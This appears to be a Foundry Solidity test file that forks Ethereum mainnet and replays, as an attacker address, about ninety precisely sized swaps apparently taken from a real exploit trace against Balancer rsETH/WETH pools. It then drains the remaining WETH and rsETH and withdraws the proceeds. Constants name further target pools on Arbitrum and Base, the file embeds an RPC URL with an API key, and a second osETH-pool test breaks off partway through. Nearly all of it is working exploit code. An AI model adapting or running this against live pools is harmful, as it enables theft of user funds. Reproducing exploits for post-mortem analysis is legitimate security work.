// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerExactSwapsTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // ETHEREUM
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_RSETH = 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f;
    address constant rsETH_WETH_BPT = 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D;
    address constant rsETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    bytes32 constant POOL_ID_OSETH = 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635;
    address constant osETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant osETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    bytes32 constant POOL_ID_WSTETH = 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2;
    address constant wstETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    bytes32 constant POOL_ID_WEETH = 0x05ff47afada98a98982113758878f9a8b9fdda0a000000000000000000000645;
    address constant weETH_rETH_BPT = 0x05ff47AFADa98a98982113758878F9A8B9FddA0a;
    address constant weETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    bytes32 constant POOL_ID_TRIPLE = 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a;
    address constant TRIPLE_BPT = 0x848a5564158d84b8A8fb68ab5D004Fae11619A54;
    address constant ezETH = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;
    address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
    bytes32 constant POOL_ID_QUAD = 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467;
    address constant QUAD_BPT = 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe;
    address constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    bytes32 constant POOL_ID_QUAD2 = 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b;
    address constant QUAD2_BPT = 0x42ED016F826165C2e5976fe5bC3df540C5aD0Af7;
    bytes32 constant POOL_ID_EZETH = 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659;
    address constant ezETH_WETH_BPT = 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E;

    // ARBITRUM
    bytes32 constant POOL_ID_ARB = 0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481;
    address constant ARB_POOL_BPT = 0x4a2F6Ae7F3e5D715689530873ec35593Dc28951B;
    address constant ARB_cbETH = 0x1DEBd73E752bEaF79865Fd6446b0c970EaE7732f;  // Index 0
    address constant ARB_wstETH = 0x5979D7b546E38E414F7E9822514be443A4800529; // Index 2
    address constant ARB_rETH = 0xEC70Dcb4A1EFa46b8F2D97C310C9c4790ba5ffA8;    // Index 3

    // BASE
    bytes32 constant POOL_ID_BASE = 0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023;
    address constant BASE_POOL_BPT = 0xC771c1a5905420DAEc317b154EB13e4198BA97D0;
    address constant BASE_WETH = 0x4200000000000000000000000000000000000006;  // Index 0 or 1
    address constant BASE_rETH = 0xB6fe221Fe9EeF5aBa221c348bA20A1Bf5e73624c;   // Index 1
    address constant BASE_ATTACKER = 0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001;
    bytes32 constant POOL_ID_BASE2 = 0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118;
    address constant BASE2_POOL_BPT = 0xaB99a3e856dEb448eD99713dfce62F937E2d4D74;
    address constant BASE_weETH = 0x04C0599Ae5A44757c0af6F9eC3b93da8976c150A;  // Index 0
    bytes32 constant POOL_ID_BASE3 = 0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026;
    address constant BASE3_POOL_BPT = 0xFb4C2E6E6e27B5b4a07a36360C89EDE29bB3c9B6;
    address constant BASE_cbETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;  // Index 0

    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
    address constant WETH_WHALE = 0x8EB8a3b98659Cce290402893d0123abb75E3ab28;

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay (param_0)
        uint8 indexIn;
        uint8 indexOut;
    }

    function testExactSwapsFromScreenshots() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: rsETH/WETH (0x58aadfb1...067f)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("rsETH:", initialBalances[1]);
        console.log("WETH:", initialBalances[2]);

        deal(rsETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(rsETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(rsETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true  // Keep funds in Vault internal balance
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;
        
        swaps[0] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 0, indexOut: 1 });
        swaps[1] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 0, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763324570062846295, expectedIn: 12010656467295420512, indexIn: 0, indexOut: 1 });
        swaps[3] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099698330643, expectedIn: 7643510086077799864, indexIn: 0, indexOut: 2 });
        swaps[4] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633245700628463, expectedIn: 120105448334705898, indexIn: 0, indexOut: 1 });
        swaps[5] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710996983306, expectedIn: 76434391222014551, indexIn: 0, indexOut: 2 });
        swaps[6] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457006285, expectedIn: 1201042840693972, indexIn: 0, indexOut: 1 });
        swaps[7] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833, expectedIn: 764337295067158, indexIn: 0, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763324570063, expectedIn: 12009836562076, indexIn: 0, indexOut: 1 });
        swaps[9] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099699, expectedIn: 7643781996846, indexIn: 0, indexOut: 2 });
        swaps[10] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633245700, expectedIn: 119833719798, indexIn: 0, indexOut: 1 });
        swaps[11] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710997, expectedIn: 76700588074, indexIn: 0, indexOut: 2 });
        swaps[12] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457, expectedIn: 1195100784, indexIn: 0, indexOut: 1 });
        swaps[13] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957110, expectedIn: 770251646, indexIn: 0, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763325, expectedIn: 11949997, indexIn: 0, indexOut: 1 });
        swaps[15] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571, expectedIn: 7703694, indexIn: 0, indexOut: 2 });
        swaps[16] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633, expectedIn: 119501, indexIn: 0, indexOut: 1 });
        swaps[17] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195, expectedIn: 77037, indexIn: 0, indexOut: 2 });
        swaps[18] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1177, expectedIn: 1196, indexIn: 0, indexOut: 1 });
        swaps[19] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 802, expectedIn: 772, indexIn: 0, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 12, expectedIn: 13, indexIn: 0, indexOut: 1 });
        swaps[21] = ExactSwapData({ tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 9, expectedIn: 10, indexIn: 0, indexOut: 2 });
        swaps[22] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 999999982, expectedIn: 242521442565, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 505209759884, indexIn: 2, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 740000000000, expectedIn: 8632, indexIn: 1, indexOut: 2 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 8615, expectedIn: 164546695481, indexIn: 2, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 359201217183, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 530000000000, expectedIn: 99746, indexIn: 1, indexOut: 2 });
        swaps[28] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 99729, expectedIn: 124012714965, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 262026461641, indexIn: 2, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 380000000000, expectedIn: 2245, indexIn: 1, indexOut: 2 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 2228, expectedIn: 81116754263, indexIn: 2, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 185639035371, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 270000000000, expectedIn: 3181, indexIn: 1, indexOut: 2 });
        swaps[34] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 3164, expectedIn: 59414792200, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 133873033883, indexIn: 2, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 190000000000, expectedIn: 557, indexIn: 1, indexOut: 2 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 540, expectedIn: 37572791964, indexIn: 2, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 95389386988, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 140000000000, expectedIn: 12882, indexIn: 1, indexOut: 2 });
        swaps[40] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 12865, expectedIn: 31471175794, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 68182079837, indexIn: 2, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 100000000000, expectedIn: 11952, indexIn: 1, indexOut: 2 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 11935, expectedIn: 23059669361, indexIn: 2, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 50043952133, indexIn: 2, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 74000000000, expectedIn: 68081608, indexIn: 1, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 68081591, expectedIn: 16971056367, indexIn: 2, indexOut: 1 });
        swaps[47] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 35553353720, indexIn: 2, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 52000000000, expectedIn: 6472, indexIn: 1, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 6455, expectedIn: 11642770535, indexIn: 2, indexOut: 1 });
        swaps[50] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 25626928172, indexIn: 2, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 38000000000, expectedIn: 142678241, indexIn: 1, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 142678224, expectedIn: 8793968805, indexIn: 2, indexOut: 1 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 18271758398, indexIn: 2, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 27000000000, expectedIn: 37323791, indexIn: 1, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 37323774, expectedIn: 6175705982, indexIn: 2, indexOut: 1 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 12989833396, indexIn: 2, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 19000000000, expectedIn: 7483, indexIn: 1, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 7466, expectedIn: 4298444362, indexIn: 2, indexOut: 1 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 9436861308, indexIn: 2, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 14000000000, expectedIn: 70418664, indexIn: 1, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 70418647, expectedIn: 3241446426, indexIn: 2, indexOut: 1 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 6724349097, indexIn: 2, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 9000000000, expectedIn: 105, indexIn: 1, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 88, expectedIn: 1369942305, indexIn: 2, indexOut: 1 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 4864998902, indexIn: 2, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 7200000000, expectedIn: 30478455, indexIn: 1, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 30478438, expectedIn: 1651719961, indexIn: 2, indexOut: 1 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 3454309834, indexIn: 2, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 5100000000, expectedIn: 10415534, indexIn: 1, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 10415517, expectedIn: 1165058728, indexIn: 2, indexOut: 1 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 2470301354, indexIn: 2, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 3600000000, expectedIn: 4200, indexIn: 1, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 4183, expectedIn: 784918068, indexIn: 2, indexOut: 1 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 1764962198, indexIn: 2, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 2600000000, expectedIn: 4107266, indexIn: 1, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 4107249, expectedIn: 587301861, indexIn: 2, indexOut: 1 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 1256903609, indexIn: 2, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 1800000000, expectedIn: 913, indexIn: 1, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 896, expectedIn: 371391165, indexIn: 2, indexOut: 1 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 905935333, indexIn: 2, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: rsETH, tokenOut: address(WETH), amount: 1300000000, expectedIn: 1011, indexIn: 1, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000, expectedIn: 2, indexIn: 1, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000, expectedIn: 380973, indexIn: 2, indexOut: 0 });
        swaps[84] = ExactSwapData({ tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000000000, expectedIn: 87478886, indexIn: 1, indexOut: 0 });
        swaps[85] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000000000, expectedIn: 141523892659, indexIn: 2, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000000000000000, expectedIn: 128359205147277, indexIn: 1, indexOut: 0 });
        swaps[87] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 136238774513878100, indexIn: 2, indexOut: 0 });
        swaps[88] = ExactSwapData({ tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 11685959850500587629, indexIn: 1, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 2, indexOut: 0 });
        

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,  // kind=1 from trace
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 5 == 4) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID_RSETH);
                console.log("After swap", i+1);
                console.log("  BPT:", currentBal[0]);
                console.log("  rsETH:", currentBal[1]);
                console.log("  WETH:", currentBal[2]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Continue draining the pool until almost empty
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
        console.log("POOL STATE BEFORE:");
        console.log("  rsETH:", midBalances[1]);
        console.log("  WETH:", midBalances[2]);

        uint256 additionalSwaps = 0;
        uint256 bptBalance = IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER);

        // Drain remaining WETH
        while (midBalances[2] > 1e9) { // Keep draining until minimal
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

            // Calculate amount
            uint256 wethToDrain = (midBalances[2] * 95) / 100;
            if (wethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(rsETH_WETH_BPT),
                assetOut: IAsset(address(WETH)),
                amount: wethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break; // Safety limit
        }

        // Drain remaining rsETH
        while (midBalances[1] > 1e9) { // Keep draining until minimal
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

            // Calculate amount
            uint256 rsethToDrain = (midBalances[1] * 95) / 100;
            if (rsethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(rsETH_WETH_BPT),
                assetOut: IAsset(rsETH),
                amount: rsethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break; // Safety limit
        }

        console.log("Additional swaps:", additionalSwaps);

        // Check internal balances in Vault
        console.log("=== VAULT INTERNAL BALANCES (BEFORE WITHDRAWAL)");
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(rsETH_WETH_BPT);
        internalTokens[2] = IERC20(rsETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);
        console.log("Internal WETH balance:", internalBalances[0], "wei");
        console.log("Internal WETH balance:", internalBalances[0] / 1e18, "ETH");
        console.log("Internal BPT balance:", internalBalances[1], "wei");
        console.log("Internal BPT balance:", internalBalances[1] / 1e18, "ETH");
        console.log("Internal rsETH balance:", internalBalances[2], "wei");
        console.log("Internal rsETH balance:", internalBalances[2] / 1e18, "ETH");

        // Check attacker balances BEFORE withdrawal
        console.log("WETH in wallet:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("BPT in wallet:", IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rsETH in wallet:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");

        // Withdraw all internal balances if any
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            // Count non-zero balances
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rsETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rsETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            // withdraw manageUserBalance()
            VAULT.manageUserBalance(ops);
            // Check balances AFTER withdrawal
            console.log("ATTACKER BALANCE AFTER:");
            console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  BPT:", IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  rsETH:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");

            uint256[] memory internalBalancesAfter = VAULT.getInternalBalance(ATTACKER, internalTokens);
            console.log("VAULT BALANCE AFTER:");
            console.log("  Internal WETH:", internalBalancesAfter[0], "wei");
            console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
            console.log("  Internal rsETH:", internalBalancesAfter[2], "wei");

            console.log("WETH withdrawn:", internalBalances[0] / 1e18, "ETH");
            console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
            console.log("rsETH withdrawn:", internalBalances[2] / 1e18, "ETH");

            console.log("Total value:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
        } else {
            console.log("No internal balances to withdraw");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("rsETH:", finalBalances[1]);
        console.log("WETH:", finalBalances[2]);

        console.log("POOL DELTAS:");
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("rsETH delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("WETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));

        console.log("ATTACKER BALANCES:");
        console.log("WETH:", WETH.balanceOf(ATTACKER));
        console.log("rsETH:", IERC20(rsETH).balanceOf(ATTACKER));
        console.log("BPT:", IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER));

        console.log("Total swaps executed:", successCount + additionalSwaps);
        console.log("  Original swaps:", successCount);
        console.log("  Additional swaps:", additionalSwaps);

        console.log("SUCCESS!");
        
    }

    function testOsEthPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: osETH/WETH (0xdacf5fa1...0635)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_OSETH);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("osETH (index 2):", initialBalances[2]);

        // Fund attacker with BPT tokens
        deal(osETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
